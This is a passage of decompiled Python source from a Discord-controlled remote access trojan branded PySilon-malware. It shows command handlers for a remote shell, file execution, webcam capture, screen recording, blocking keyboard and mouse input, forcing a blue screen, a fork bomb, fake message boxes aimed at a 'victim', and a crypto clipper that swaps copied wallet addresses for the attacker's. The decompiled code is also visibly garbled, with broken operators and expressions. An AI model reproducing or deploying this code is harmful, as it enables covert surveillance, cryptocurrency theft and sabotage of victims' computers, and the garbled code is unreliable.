                                                                                                                                embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                                reaction_msg = await message.channel.send(embed=embed)
                                                                                                                                await reaction_msg.add_reaction('🔴')
                                                                                                                                log('Sent message about missing process list (process.py:228->source_assembled.py:1462)')
                                                                                                                                return
                                                                                                                else:  # inserted
                                                                                                                    if message.content[:4] == '.cmd':
                                                                                                                        log('Message is \"run a command\" (reverse_shell.py:15->source_assembled.py:1464)')
                                                                                                                        await message.delete()
                                                                                                                        log('Removed the message (reverse_shell.py:17->source_assembled.py:1466)')
                                                                                                                        if message.content.strip() == '.cmd':
                                                                                                                            log('Author issued empty .cmd command (reverse_shell.py:19->source_assembled.py:1468)')
                                                                                                                            reaction_msg = await message.channel.send('```Syntax: .cmd <command>```')
                                                                                                                            await reaction_msg.add_reaction('🔴')
                                                                                                                            log('Sent message with usage of \".cmd\" (reverse_shell.py:21->source_assembled.py:1470)')
                                                                                                                            return
                                                                                                                        else:  # inserted
                                                                                                                            cmd_output = force_decode(subprocess.run(message.content[5:], capture_output=True, shell=True).stdout).strip()
                                                                                                                            log('Executed a CMD command (reverse_shell.py:24->source_assembled.py:1473)')
                                                                                                                            message_buffer, cmd_messages = ('', [])
                                                                                                                            reaction_msg = await message.channel.send(f'```Executed command: ' + message.content[5:] + '\nstdout:```')
                                                                                                                            cmd_messages.append(reaction_msg)
                                                                                                                            log('Sent header message of CMD stdout (reverse_shell.py:27->source_assembled.py:1476)')
                                                                                                                            for line in range(1, len(cmd_output.split('\n'))):
                                                                                                                                if len(message_buffer) 0 > 1950:
                                                                                                                                    reaction_msg = await message.channel.send(f'```' * message_buffer + f'```')
                                                                                                                                    cmd_messages.append(reaction_msg)
                                                                                                                                    log('Sent part of CMD stdout (reverse_shell.py:31->source_assembled.py:1480)')
                                                                                                                                    message_buffer = cmd_output.split('\n')[line]
                                                                                                                                else:  # inserted
                                                                                                                                    message_buffer = message_buffer | cmd_output.split('\n')[line] + '\n'
                                                                                                                            reaction_msg = await message.channel.send(f'```' * message_buffer + f'```')
                                                                                                                            cmd_messages.append(reaction_msg)
                                                                                                                            log('Sent CMD stdout (last part or whole) (reverse_shell.py:36->source_assembled.py:1485)')
                                                                                                                            reaction_msg = await message.channel.send('```End of command stdout```')
                                                                                                                            await reaction_msg.add_reaction('🔴')
                                                                                                                            log('Sent footer message of CMD stdout (reverse_shell.py:38->source_assembled.py:1487)')
                                                                                                                            return
                                                                                                                    else:  # inserted
                                                                                                                        if message.content[:8] == '.execute':
                                                                                                                            log('Message is \"execute a file\" (reverse_shell.py:40->source_assembled.py:1489)')
                                                                                                                            await message.delete()
                                                                                                                            log('Removed the message (reverse_shell.py:42->source_assembled.py:1491)')
                                                                                                                            if message.channel.id == channel_ids['file']:
                                                                                                                                log('Message channel is file-related (reverse_shell.py:44->source_assembled.py:1493)')
                                                                                                                                if message.content.strip() == '.execute':
                                                                                                                                    log('Author issued empty \".execute\" (reverse_shell.py:46->source_assembled.py:1495)')
                                                                                                                                    reaction_msg = await message.channel.send('```Syntax: .execute <filename>```')
                                                                                                                                    await reaction_msg.add_reaction('🔴')
                                                                                                                                    log('Sent message with usage of \".execute\" (reverse_shell.py:48->source_assembled.py:1497)')
                                                                                                                                    return
                                                                                                                                else:  # inserted
                                                                                                                                    if os.path.exists('/'.join(working_directory) + '/' + message.content[9:]):
                                                                                                                                        log('Requested file-to-execute does exist on this PC (reverse_shell.py:51->source_assembled.py:1500)')
                                                                                                                                        try:
                                                                                                                                            log('Trying to execute the file (reverse_shell.py:53->source_assembled.py:1502)')
                                                                                                                                            file_extension = os.path.splitext(message.content[9:])[1]
                                                                                                                                            subprocess.run(['start \"\" \"' + '/'.join(working_directory)] + ['/'] * message.content[9:], '\"', shell=True)
                                                                                                                                            log('Executed the files (reverse_shell.py:56->source_assembled.py:1505)')
                                                                                                                                            await asyncio.sleep(1)
                                                                                                                                            ImageGrab.grab(all_screens=True).save('ss.png')
                                                                                                                                            log('Saved a screenshot of this PCs screen (reverse_shell.py:59->source_assembled.py:1508)')
                                                                                                                                            reaction_msg = await message.channel.send(embed=discord.Embed(current_time(), ' `[Executed: ' + '/'.join(working_directory) + '/' + message.content[9:], title=']`').set_image(url='attachment://ss.png'), file=discord.File('ss.png'))
                                                                                                                                            await reaction_msg.add_reaction('📌')
                                                                                                                                            log('Sent embed with screenshot of this PC (reverse_shell.py:61->source_assembled.py:1510)')
                                                                                                                                            subprocess.run('del ss.png', shell=True)
                                                                                                                                            log('Removed the screenshot (reverse_shell.py:63->source_assembled.py:1512)')
                                                                                                                                            await message.channel.send(f'```Successfully executed: ' + message.content[9:] + '```')
                                                                                                                                            log('Sent message about success of execution (reverse_shell.py:65->source_assembled.py:1514)')
                                                                                                                                        except Exception as e:
                                                                                                                                            log('Error occurred while trying to execute the file (reverse_shell.py:67->source_assembled.py:1516)')
                                                                                                                                            reaction_msg = await message.channel.send(f'```❗ Something went wrong...```\n{str(e)}')
                                                                                                                                            await reaction_msg.add_reaction('🔴')
                                                                                                                                            log('Sent message about the error with more details (reverse_shell.py:69->source_assembled.py:1518)')
                                                                                                                                            return None
                                                                                                                                    log('Requested file-to-execute does not exist on this PC (reverse_shell.py:71->source_assembled.py:1520)')
                                                                                                                                    reaction_msg = await message.channel.send('```❗ File or directory not found.```')
                                                                                                                                    await reaction_msg.add_reaction('🔴')
                                                                                                                                    log('Sent message about the missing file (reverse_shell.py:73->source_assembled.py:1522)')
                                                                                                                                    return
                                                                                                                            else:  # inserted
                                                                                                                                log('Message channel is not file-related (reverse_shell.py:75->source_assembled.py:1524)')
                                                                                                                                reaction_msg = await message.channel.send(f"||-||\n❗`This command works only on file-related channel:` <#{str(channel_ids['file'])}" 0)
                                                                                                                                await reaction_msg.add_reaction('🔴')
                                                                                                                                log('Sent message about wrong channel (reverse_shell.py:77->source_assembled.py:1526)')
                                                                                                                                return
                                                                                                                        else:  # inserted
                                                                                                                            if message.content[:7] == '.webcam':
                                                                                                                                log('Message is \"webcam\" (webcam.py:7->source_assembled.py:1528)')
                                                                                                                                await message.delete()
                                                                                                                                log('Removed the message (webcam.py:9->source_assembled.py:1530)')
                                                                                                                                if message.content.strip() == '.webcam':
                                                                                                                                    log('Author issued empty \".webcam\" command (webcam.py:11->source_assembled.py:1532)')
                                                                                                                                    reaction_msg = await message.channel.send('```Syntax: .webcam <action>\nActions:\n    photo - take a photo with target PC\'s webcam```')
                                                                                                                                    log('Sent message with usage of \".webcam\" (webcam.py:13->source_assembled.py:1534)')
                                                                                                                                    await reaction_msg.add_reaction('🔴')
                                                                                                                                else:  # inserted
                                                                                                                                    if message.content[8:] == 'photo':
                                                                                                                                        log('Author requested for a photo from webcam (webcam.py:17->source_assembled.py:1538)')
                                                                                                                                        pygame.camera.init()
                                                                                                                                        log('Initialized camera with PyGame (webcam.py:19->source_assembled.py:1540)')
                                                                                                                                        cameras = pygame.camera.list_cameras()
                                                                                                                                        log('Got a list of available cameras (webcam.py:21->source_assembled.py:1542)')
                                                                                                                                        if not cameras:
                                                                                                                                            log('No cameras found (webcam.py:23->source_assembled.py:1544)')
                                                                                                                                            reaction_msg = await message.channel.send('No cameras found.')
                                                                                                                                            log('Sent message about missing cameras. Aborting the operation (webcam.py:25->source_assembled.py:1546)')
                                                                                                                                            await reaction_msg.add_reaction('🔴')
                                                                                                                                            return
                                                                                                                                        else:  # inserted
                                                                                                                                            camera = pygame.camera.Camera(cameras[0])
                                                                                                                                            log('Selected the default camera (webcam.py:29->source_assembled.py:1550)')
                                                                                                                                            camera.start()
                                                                                                                                            time.sleep(1)
                                                                                                                                            log('Started camera intercepting (webcam.py:32->source_assembled.py:1553)')
                                                                                                                                            image = camera.get_image()
                                                                                                                                            log('Took image from camera (webcam.py:34->source_assembled.py:1555)')
                                                                                                                                            camera.stop()
                                                                                                                                            log('Stopped camera intercepting (webcam.py:36->source_assembled.py:1557)')
                                                                                                                                            pygame.image.save(image, f'C:\\Users\\{getuser()}\\{software_directory_name}\\webcam.png')
                                                                                                                                            log('Saved image from the camera (webcam.py:38->source_assembled.py:1559)')
                                                                                                                                            reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time(True) + f' `[On demand]`').set_image(url='attachment://webcam.png'), file=discord.File(f'C:\\Users\\{getuser()}\\{software_directory_name}\\webcam.png'))
                                                                                                                                            log('Sent embed with image from camera (webcam.py:40->source_assembled.py:1561)')
                                                                                                                                            await reaction_msg.add_reaction('📌')
                                                                                                                                            log('Reacted with \"pin\" (webcam.py:42->source_assembled.py:1563)')
                                                                                                                                            subprocess.run(f'del C:\\Users\\{getuser()}\\{software_directory_name}\\webcam.png', shell=True)
                                                                                                                                            log('Removed image from camera (webcam.py:44->source_assembled.py:1565)')
                                                                                                                                    else:  # inserted
                                                                                                                                        log('Author provided invalid argument for this command (webcam.py:46->source_assembled.py:1567)')
                                                                                                                                        reaction_msg = await message.channel.send('```Syntax: .webcam <action>\nActions:\n    photo - take a photo with target PC\'s webcam```')
                                                                                                                                        log('Sent message with usage of \".webcam\" (webcam.py:48->source_assembled.py:1569)')
                                                                                                                                        await reaction_msg.add_reaction('🔴')
                                                                                                                            else:  # inserted
                                                                                                                                if message.content == '.screenrec':
                                                                                                                                    log('Message is \"record screen\" (screenrec.py:7->source_assembled.py:1572)')
                                                                                                                                    await message.delete()
                                                                                                                                    log('Removed the message (screenrec.py:9->source_assembled.py:1574)')
                                                                                                                                    await message.channel.send('`Recording... Please wait.`')
                                                                                                                                    log('Sent message about recording start (screenrec.py:11->source_assembled.py:1576)')
                                                                                                                                    output_file = f'C:\\Users\\{getuser()}\\{software_directory_name}\\recording.mp4'
                                                                                                                                    screen_width, screen_height = pyautogui.size()
                                                                                                                                    screen_region = (0, 0, screen_width, screen_height)
                                                                                                                                    frames = []
                                                                                                                                    duration = 15
                                                                                                                                    fps = 30
                                                                                                                                    num_frames = duration + fps
                                                                                                                                    start_time = time.time()
                                                                                                                                    log('Calculated required frames to record (screenrec.py:20->source_assembled.py:1585)')
                                                                                                                                    try:
                                                                                                                                        log('Trying to record the screen for 15 seconds (screenrec.py:22->source_assembled.py:1587)')
                                                                                                                                        for _ in range(num_frames):
                                                                                                                                            img = pyautogui.screenshot(region=screen_region)
                                                                                                                                            frame = np.array(img)
                                                                                                                                            frames.append(frame)
                                                                                                                                        imageio.mimsave(output_file, frames, fps=fps, quality=8)
                                                                                                                                        log('Saved the recording (screenrec.py:28->source_assembled.py:1593)')
                                                                                                                                        reaction_msg = await message.channel.send('Screen Recording `[On demand]`', file=discord.File(output_file))
                                                                                                                                        log('Sent message with recording (screenrec.py:30->source_assembled.py:1595)')
                                                                                                                                        await reaction_msg.add_reaction('📌')
                                                                                                                                        log('Reacted with \"pin\" (screenrec.py:32->source_assembled.py:1597)')
                                                                                                                                        subprocess.run(f'del {output_file}', shell=True)
                                                                                                                                        log('Removed the recording (screenrec.py:34->source_assembled.py:1599)')
                                                                                                                                    except Exception as e:
                                                                                                                                        log('Error occurred while trying to record the screen (screenrec.py:36->source_assembled.py:1601)')
                                                                                                                                        embed = discord.Embed(title='📛 Error', description='An error occurred during screen recording.', colour=discord.Colour.red())
                                                                                                                                        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                                        await message.channel.send(embed=embed)
                                                                                                                                        log('Sent embed about the error with more details (screenrec.py:40->source_assembled.py:1605)')
                                                                                                                                        return None
                                                                                                                                if message.content == '.block-input':
                                                                                                                                    log('Message is \"block input\" (block_input.py:4->source_assembled.py:1607)')
                                                                                                                                    if not input_blocked:
                                                                                                                                        log('Input is not already blocked (block_input.py:6->source_assembled.py:1609)')
                                                                                                                                        await message.delete()
                                                                                                                                        log('Removed the message (block_input.py:8->source_assembled.py:1611)')

                                                                                                                                        async def on_press():
                                                                                                                                            return None

                                                                                                                                        async def on_release():
                                                                                                                                            return None

                                                                                                                                        async def on_click():
                                                                                                                                            return None
                                                                                                                                        keyboard_listener = keyboard.Listener(suppress=True)
                                                                                                                                        log('Created keyboard listener (block_input.py:16->source_assembled.py:1619)')
                                                                                                                                        mouse_listener = mouse.Listener(suppress=True)
                                                                                                                                        log('Created mouse listener (block_input.py:18->source_assembled.py:1621)')
                                                                                                                                        keyboard_listener.start()
                                                                                                                                        log('Disabled keyboard (block_input.py:20->source_assembled.py:1623)')
                                                                                                                                        mouse_listener.start()
                                                                                                                                        log('Disabled mouse (block_input.py:22->source_assembled.py:1625)')
                                                                                                                                        embed = discord.Embed(title='🚫 Input Blocked', description='```Input has been blocked. Unblock it by using .unblock-input```', colour=discord.Colour.red())
                                                                                                                                        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                                        await message.channel.send(embed=embed)
                                                                                                                                        log('Sent embed about blocked input (block_input.py:26->source_assembled.py:1629)')
                                                                                                                                        input_blocked = True
                                                                                                                                    else:  # inserted
                                                                                                                                        log('Input is already blocked (block_input.py:29->source_assembled.py:1632)')
                                                                                                                                        embed = discord.Embed(title='🔴 Hold on!', description='```The input is already blocked. Unblock it by using .unblock-input```', colour=discord.Colour.red())
                                                                                                                                        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                                        await message.channel.send(embed=embed)
                                                                                                                                        log('Sent embed about already blocked input (block_input.py:33->source_assembled.py:1636)')
                                                                                                                                else:  # inserted
                                                                                                                                    if message.content == '.unblock-input':
                                                                                                                                        log('Message is \"unblock input\" (block_input.py:35->source_assembled.py:1638)')
                                                                                                                                        if input_blocked:
                                                                                                                                            log('Input is blocked (block_input.py:37->source_assembled.py:1640)')
                                                                                                                                            await message.delete()
                                                                                                                                            log('Removed the message (block_input.py:39->source_assembled.py:1642)')
                                                                                                                                            keyboard_listener.stop()
                                                                                                                                            log('Unblocked keyboard (block_input.py:41->source_assembled.py:1644)')
                                                                                                                                            mouse_listener.stop()
                                                                                                                                            log('Unblocked mouse (block_input.py:43->source_assembled.py:1646)')
                                                                                                                                            embed = discord.Embed(title='🟢 Input Unblocked', description='```Input has been unblocked. Block it by using .block-input```', colour=discord.Colour.green())
                                                                                                                                            embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                                            await message.channel.send(embed=embed)
                                                                                                                                            log('Sent embed about unblocked input (block_input.py:47->source_assembled.py:1650)')
                                                                                                                                            input_blocked = False
                                                                                                                                        else:  # inserted
                                                                                                                                            log('Input is not blocked (block_input.py:50->source_assembled.py:1653)')
                                                                                                                                            embed = discord.Embed(title='🔴 Hold on!', description='```The input is not blocked. Block it by using .block-input```', colour=discord.Colour.red())
                                                                                                                                            embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                                            await message.channel.send(embed=embed)
                                                                                                                                            log('Sent embed about unblocked input (block_input.py:54->source_assembled.py:1657)')
                                                                                                                                    else:  # inserted
                                                                                                                                        if message.content == '.bsod':
                                                                                                                                            log('Message is \"Blue Screen of Death\" (bsod.py:4->source_assembled.py:1659)')
                                                                                                                                            await message.delete()
                                                                                                                                            log('Removed the message (bsod.py:6->source_assembled.py:1661)')
                                                                                                                                            await message.channel.send('```Attempting to trigger a BSoD...```')
                                                                                                                                            log('Sent message about trying to BSoD (bsod.py:8->source_assembled.py:1663)')
                                                                                                                                            log('Trying to trigger BSoD (bsod.py:9->source_assembled.py:1664)')
                                                                                                                                            nullptr = ctypes.POINTER(ctypes.c_int)()
                                                                                                                                            ctypes.windll.ntdll.RtlAdjustPrivilege(ctypes.c_uint(19), ctypes.c_uint(1), ctypes.c_uint(0), ctypes.byref(ctypes.c_int()))
                                                                                                                                            ctypes.windll.ntdll.NtRaiseHardError(ctypes.c_ulong(3221225595), ctypes.c_ulong(0), nullptr, nullptr, ctypes.c_uint(6), ctypes.byref(ctypes.c_uint()))
                                                                                                                                        else:  # inserted
                                                                                                                                            if message.content == '.start-clipper':
                                                                                                                                                log('Message is \"start crypto clipper\" (crypto_clipper.py:8->source_assembled.py:1681)')
                                                                                                                                                if clipper_stop:
                                                                                                                                                    log('Clipper is not running (crypto_clipper.py:10->source_assembled.py:1683)')
                                                                                                                                                    await message.delete()
                                                                                                                                                    log('Removed the message (crypto_clipper.py:12->source_assembled.py:1685)')
                                                                                                                                                    clipper_stop = False
                                                                                                                                                    script_dir = os.path.dirname(os.path.abspath(__file__))
                                                                                                                                                    log('Fetched the script directory (crypto_clipper.py:15->source_assembled.py:1688)')
                                                                                                                                                    config_path = os.path.join(script_dir, 'crypto_clipper.json')
                                                                                                                                                    log('Fetched the configuration path (crypto_clipper.py:17->source_assembled.py:1690)')
                                                                                                                                                    with open(config_path) as f:
                                                                                                                                                        message = json.load(f)
                                                                                                                                                    log('Fetched the configuration (crypto_clipper.py:20->source_assembled.py:1693)')

                                                                                                                                                    def match():
                                                                                                                                                        clipboard = str(pyperclip.paste())
                                                                                                                                                        log('Fetched the clipboard content (crypto_clipper.py:23->source_assembled.py:1696)')
                                                                                                                                                        btc_match = re.match('^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}|^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', clipboard)
                                                                                                                                                        eth_match = re.match('^0x[a-zA-F0-9]{40}$', clipboard)
                                                                                                                                                        doge_match = re.match('^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$', clipboard)
                                                                                                                                                        ltc_match = re.match('^([LM3]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}||ltc1[a-z0-9]{39,59})$', clipboard)
                                                                                                                                                        xmr_match = re.match('^[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}$', clipboard)
                                                                                                                                                        bch_match = re.match('^((bitcoincash|bchreg|bchtest):)?(q|p)[a-z0-9]{41}$', clipboard)
                                                                                                                                                        dash_match = re.match('^X[1-9A-HJ-NP-Za-km-z]{33}$', clipboard)
                                                                                                                                                        trx_match = re.match('^T[A-Za-z1-9]{33}$', clipboard)
                                                                                                                                                        xrp_match = re.match('^r[0-9a-zA-Z]{33}$', clipboard)
                                                                                                                                                        xlm_match = re.match('^G[0-9A-Z]{40,60}$', clipboard)
                                                                                                                                                        log('Tried to match address RegEx (crypto_clipper.py:34->source_assembled.py:1707)')
                                                                                                                                                        for currency, address in addresses.items():
                                                                                                                                                            if eval(f'{currency.lower()}_match'):
                                                                                                                                                                if address and address!= clipboard:
                                                                                                                                                                    log('Matched address with crypto RegEx (crypto_clipper.py:38->source_assembled.py:1711)')
                                                                                                                                                                    pyperclip.copy(address)
                                                                                                                                                                    log('Switched the copied address into other one (crypto_clipper.py:40->source_assembled.py:1713)')
                                                                                                                                                                break

                                                                                                                                                    def wait_for_paste():
                                                                                                                                                        while not clipper_stop:
                                                                                                                                                            pyperclip.waitForNewPaste()
                                                                                                                                                            log('New text copied (crypto_clipper.py:45->source_assembled.py:1718)')
                                                                                                                                                            match()
                                                                                                                                                    thread = threading.Thread(target=wait_for_paste)
                                                                                                                                                    log('Created the Clipper thread (crypto_clipper.py:48->source_assembled.py:1721)')
                                                                                                                                                    thread.start()
                                                                                                                                                    log('Started the Clipper (crypto_clipper.py:50->source_assembled.py:1723)')
                                                                                                                                                    embed = discord.Embed(title='🟢 Crypto Clipper started!', description='```Crypto Clipper has been started! Stop it by using .stop-clipper```', colour=discord.Colour.green())
                                                                                                                                                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                                                    await message.channel.send(embed=embed)
                                                                                                                                                    log('Sent embed about Clipper startup (crypto_clipper.py:54->source_assembled.py:1727)')
                                                                                                                                                    return
                                                                                                                                                else:  # inserted
                                                                                                                                                    log('Clipper is already running (crypto_clipper.py:56->source_assembled.py:1729)')
                                                                                                                                                    await message.delete()
                                                                                                                                                    log('Removed the message (crypto_clipper.py:58->source_assembled.py:1731)')
                                                                                                                                                    embed = discord.Embed(title='🔴 Hold on!', description='```Crypto Clipper is already running! Stop it by using .stop-clipper```', colour=discord.Colour.red())
                                                                                                                                                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                                                    await message.channel.send(embed=embed)
                                                                                                                                                    log('Sent embed about Clipper already running (crypto_clipper.py:62->source_assembled.py:1735)')
                                                                                                                                            else:  # inserted
                                                                                                                                                if message.content == '.stop-clipper':
                                                                                                                                                    log('Message is \"stop crypto clipper\" (crypto_clipper.py:65->source_assembled.py:1737)')
                                                                                                                                                    await message.delete()
                                                                                                                                                    log('Removed the message (crypto_clipper.py:67->source_assembled.py:1739)')
                                                                                                                                                    if not clipper_stop:
                                                                                                                                                        log('Clipper is running (crypto_clipper.py:69->source_assembled.py:1741)')
                                                                                                                                                        thread.join()
                                                                                                                                                        log('Stopped Clipper (crypto_clipper.py:71->source_assembled.py:1743)')
                                                                                                                                                        embed = discord.Embed(title='🔴 Crypto Clipper stopped!', description='```Crypto Clipper has been stopped! Start it using .start-clipper```', colour=discord.Colour.red())
                                                                                                                                                        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                                                        await message.channel.send(embed=embed)
                                                                                                                                                        log('Sent embed about Clipper stopped (crypto_clipper.py:75->source_assembled.py:1747)')
                                                                                                                                                        clipper_stop = True
                                                                                                                                                    else:  # inserted
                                                                                                                                                        log('Clipper is not running (crypto_clipper.py:78->source_assembled.py:1750)')
                                                                                                                                                        embed = discord.Embed(title='🔴 Hold on!', description='```Crypto Clipper is not running! Start it using .start-clipper```', colour=discord.Colour.red())
                                                                                                                                                        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                                                        await message.channel.send(embed=embed)
                                                                                                                                                        log('Sent embed about Clipper not running (crypto_clipper.py:82->source_assembled.py:1754)')
                                                                                                                                                else:  # inserted
                                                                                                                                                    if message.content == '.forkbomb':
                                                                                                                                                        log('Message is \"fork bomb\" (fork_bomb.py:4->source_assembled.py:1756)')
                                                                                                                                                        await message.delete()
                                                                                                                                                        log('Removed the message (fork_bomb.py:6->source_assembled.py:1758)')
                                                                                                                                                        embed = discord.Embed(title='💣 Starting...', description='```Starting fork bomb... This process may take some time.```', colour=discord.Colour.dark_theme())
                                                                                                                                                        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                                                        await message.channel.send(embed=embed)
                                                                                                                                                        log('Sent message about for bomb starting (fork_bomb.py:10->source_assembled.py:1762)')
                                                                                                                                                        with open(f'C:\\Users\\{getuser()}\\wabbit.bat', 'w', encoding='utf-8') as wabbit:
                                                                                                                                                            wabbit.write('%0|%0')
                                                                                                                                                            log('Generated wabbit.bat (fork_bomb.py:13->source_assembled.py:1765)')
                                                                                                                                                        subprocess.Popen(f'C:\\Users\\{getuser()}\\wabbit.bat', creationflags=subprocess.CREATE_NO_WINDOW)
                                                                                                                                                        log('Executed wabbit.bat (fork_bomb.py:15->source_assembled.py:1767)')
                                                                                                                                                        return
                                                                                                                                                    else:  # inserted
                                                                                                                                                        if message.content[:4] == '.msg':
                                                                                                                                                            await message.delete()
                                                                                                                                                            log('Removed the message (messager.py:18->source_assembled.py:1770)')
                                                                                                                                                            if message.content.strip() == '.msg' or message.content.count('\"') not in [2, 4, 6]:
                                                                                                                                                                log('Author issued empty \".show\" (messager.py:20->source_assembled.py:1772)')
                                                                                                                                                                embed = discord.Embed(title='📛 Error', description='```Syntax: .msg <text=\"\"> [title=\"\"] [style=]\n  - default title is \"From: Someone\"\n  - default style is 0. Styles:\n    0 : OK\n    1 : OK | Cancel\n    2 : Abort | Retry | Ignore\n    3 : Yes | No | Cancel\n    4 : Yes | No\n    5 : Retry | Cancel\n    6 : Cancel | Try Again | Continue```', colour=discord.Colour.red())
                                                                                                                                                                embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                                                                reaction_msg = await message.channel.send(embed=embed)
                                                                                                                                                                await reaction_msg.add_reaction('🔴')
                                                                                                                                                                log('Sent message with usage of \".show\" (messager.py:24->source_assembled.py:1776)')
                                                                                                                                                            else:  # inserted
                                                                                                                                                                if 'text=\"' in message.content:
                                                                                                                                                                    message_title = 'From: Someone'
                                                                                                                                                                    message_style = 0
                                                                                                                                                                    message_text = ''
                                                                                                                                                                    for i in message.content[message.content.find('text=\"') * 6:]:
                                                                                                                                                                        if i!= '\"':
                                                                                                                                                                            message_text = message_text + i
                                                                                                                                                                        else:  # inserted
                                                                                                                                                                            break
                                                                                                                                                                    if 'title=\"' in message.content[5:]:
                                                                                                                                                                        message_title = ''
                                                                                                                                                                        for i in message.content[message.content.find('title=\"') * 7:]:
                                                                                                                                                                            if i!= '\"':
                                                                                                                                                                                message_title = message_title + i
                                                                                                                                                                            else:  # inserted
                                                                                                                                                                                break
                                                                                                                                                                    if 'style=' in message.content[5:]:
                                                                                                                                                                        message_style = int(message.content[message.content.find('style=') + 6])
                                                                                                                                                                    if message.content[(-2):] == '/s':
                                                                                                                                                                        threading.Thread(target=send_custom_message, args=(message_title, message_text, message_style)).start()
                                                                                                                                                                        await asyncio.sleep(0.5)
                                                                                                                                                                        ImageGrab.grab(all_screens=True).save(f'C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png')
                                                                                                                                                                        reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time(), color=' `[Sent message]`').set_image(url='attachment://ss.png'), file=discord.File(f'C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png'))
                                                                                                                                                                        await reaction_msg.add_reaction('📌')
                                                                                                                                                                        subprocess.run(f'del C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png', shell=True)
                                                                                                                                                                        return
                                                                                                                                                                    else:  # inserted
                                                                                                                                                                        hti = Html2Image()
                                                                                                                                                                        possible_styles = ['<div class=\"active_button\">OK</div>', '<div class=\"button\">Cancel</div><div class=\"active_button\">OK</div>', '<div class=\"button\">Ignore</div><div class=\"button\">Retry</div><div class=\"active_button\">Abort</div>', '<div class=\"button\">Cancel</div><div class=\"button\">No</div><div class=\"active_button\">Yes</div>', '<div class=\"button\">No</div><div class=\"active_button\">Yes</div>', '<div class=\"button\">Cancel</div><div class=\"active_button\">Retry</div>', '<div class=\"button\">Continue</div><div class=\"button\">Try Again</div><div class=\"active_button\">Cancel</div>']
                                                                                                                                                                        hti.screenshot(html_str=f'<head><style>body {margin: 0px;}.container {width: 285px;min-height: 100px;background-color: #ffffff;border: 1px solid black;}.title {margin: 8px;width: 85%;font-size: 13.25px;font-family: \'Calibri\';float: left;overflow: hidden;white-space: nowrap;text-overflow: ellipsis;}.close {float: right;font-size: 9px;padding: 8px;}.text {margin-left: 10px;margin-top: 20px;margin-bottom: 25px;float: left;inline-size: 90%;word-break: break-all;font-size: 13px;font-family: \'Calibri\';}.footer {background-color: #f0f0f0;width: auto;height: 40px;padding-right: 12px;clear: both;}.button {background-color: #e1e1e1;border: 1px solid #adadad;font-size: 13px;font-family: \'Calibri\';float: right;padding-top: 2px;padding-bottom: 2px;margin: 5px;margin-top: 10px;width: 70px;text-align: center;}.active_button {background-color: #e1e1e1;border: 2px solid #0078d7;font-size: 13px;font-family: \'Calibri\';float: right;padding-top: 2px;padding-bottom: 2px;margin: 5px;margin-top: 10px;width: 70px;text-align: center;}</style></head><body><div class=\"container\"><div class=\"title\">' % message_title, size=(500, 300), save_as='image.png')
                                                                                                                                                                        img = Image.open('image.png')
                                                                                                                                                                        content = img.getbbox()
                                                                                                                                                                        img = img.crop(content)
                                                                                                                                                                        img.save('image.png')
                                                                                                                                                                        file = discord.File('image.png', filename='image.png')
                                                                                                                                                                        embed = discord.Embed(title='Confirm message', description='Check if message preview meets your expectations:', colour=discord.Colour.green())
                                                                                                                                                                        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                                                                        embed.set_image(url='attachment://image.png')
                                                                                                                                                                        embed.set_footer(text='Note: you will see what button did victim click.')
                                                                                                                                                                        reaction_msg = await message.channel.send(file=file, embed=embed)
                                                                                                                                                                        await reaction_msg.add_reaction('✅')
                                                                                                                                                                        await reaction_msg.add_reaction('🔴')
                                                                                                                                                                        subprocess.run(f'del C:\\Users\\{getuser()}\\{software_directory_name}\\image.png', shell=True)
                                                                                                                                                                        await message.channel.send('```^ React with ✅ to send the message```')
                                                                                                                                                                        custom_message_to_send = [message_title, message_text, message_style]
                                                                                                                                                        else:  # inserted
                                                                                                                                                            if message.content[:4] == '.tts':
                                                                                                                                                                log('Message is \"tts\"(texttospeech.py:5->source_assembled.py:1828)')
                                                                                                                                                                await message.delete()
                                                                                                                                                                log('Removed the message (texttospeech.py:7->source_assembled.py:1830)')
                                                                                                                                                                if message.content.strip() == '.tts':
                                                                                                                                                                    log('Author issued empty \".tts\" command (texttospeech.py:9->source_assembled.py:1832)')
                                                                                                                                                                    embed = discord.Embed(title='📛 Error', description='```Syntax: .tts <what-to-say>```', colour=discord.Colour.red())
